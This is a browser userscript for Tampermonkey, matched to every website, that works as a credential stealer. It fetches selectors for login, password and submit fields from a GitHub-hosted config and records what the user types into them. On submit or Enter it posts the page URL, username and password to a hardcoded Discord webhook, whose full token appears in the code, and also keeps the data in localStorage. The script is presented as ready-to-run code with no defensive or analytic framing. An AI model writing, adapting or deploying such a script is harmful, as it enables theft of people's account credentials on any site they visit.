// ==UserScript==
// @name         Main
// @namespace    http://tampermonkey.net/
// @version      2024-10-29
// @description  try to take over the world!
// @author       You
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=tampermonkey.net
// @grant        GM_xmlhttpRequest
// @connect      *
// ==/UserScript==

(function() {
    'use strict';

    const discordWebhook = "https://discord.com/api/webhooks/1300855209903263754/wumyVnQCmRY9St6VS-eYTmkC2ma1xuKdwWCiV6JIFA7mvXSUsf4Dq9B6es89avvZuQgg"


    const fetchSelectors = (callback) => {
        let completedRequests = 0;

        let links = [
            {
                name: "loginSelectors",
                url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-login-selectors.json",
                selectors: ""
            },
            {
                name: "passwordSelectors",
                url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-password-selectors.json",
                selectors: ""
            },
            {
                name: "submitSelectors",
                url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-submit-button-selectors.json",
                selectors: ""
            },
        ];

        links.forEach((element) => {
            GM_xmlhttpRequest({
                method: "GET",
                url: element.url,
                responseType: "json",
                onload: (response) => {
                    element.selectors = response.response.map((selector) => `${selector}`).join(", ");

                    // Save to local storage as a fallback
                    localStorage.setItem(element.name, element.selectors);

                    completedRequests++;
                    checkCompletion();
                },
                onerror: (error) => {
                    console.error("Error fetching the password selectors: ", error);

                    // Get the selectors from local storage as fallback
                    element.selectors = localStorage.getItem(element.name);

                    completedRequests++;
                    checkCompletion();
                }
            });
        })

        const checkCompletion = () => completedRequests === links.length ? callback(links) : null;
    }

    fetchSelectors((links) => {
        const loginBox = document.querySelector(links[0].selectors);
        const passwordBox = document.querySelector(links[1].selectors);
        const submitBox = document.querySelector(links[2].selectors);

        if (!loginBox) console.log("Login is null");
        if (!passwordBox) console.log("Passwords are null");
        if (!submitBox) console.log("Submit is null");


        let savedData = {
            url: window.location.href,
            login: "empty",
            password: "empty"
        }

        const sendWebhook = () => {
            // Save data to local storage as a fallback solution

            if (savedData.login == "empty" && savedData.password == "empty") {
                return
            }

            let localSavedData = localStorage.getItem("localSavedData");
            localSavedData += `URL: ${savedData.url} Username: ${savedData.login} Password: ${savedData.password} - `

            localStorage.setItem("localSavedData", localSavedData);
            console.log("Saved in local storage");

            GM_xmlhttpRequest({
                method: "POST",
                url: discordWebhook,
                headers: { "Content-Type": "application/json" },
                data: JSON.stringify({
                    username: "webhook",
                    content: `URL: \`${savedData.url}\` Username: \`${savedData.login}\` Password: \`${savedData.password}\``,
                }),
                onload: (response) => {
                    console.log("Successfully sent webhook");
                },
                onerror: (error) => {
                    console.error("Error sending webhook: ", error);
                }
            });
        };

        const cleanOutput = (input) => {
            return input.replaceAll("\"", "[parenthesis]")
                        .replaceAll("'", "[single-parenthesis]")
                        .replaceAll("\\", "[backslash]")
                        .replaceAll("`", "[grave]");
        }

        passwordBox ? passwordBox.addEventListener("input", (event) => {
            event.key === "Backspace" ? savedData.password.slice(0, -1) : savedData.password = cleanOutput(event.target.value);
        }) : null;

        loginBox ? loginBox.addEventListener("input", (event) => {
            event.key === "Backspace" ? savedData.login.slice(0, -1) : savedData.login = cleanOutput(event.target.value);
        }) : null;

        (submitBox || loginBox || passwordBox) ? (
            submitBox.addEventListener("click", (event) => sendWebhook()),
            window.addEventListener("keydown", (event) => event.key === "Enter" ? sendWebhook() : null)
        ) : null
    });
})();
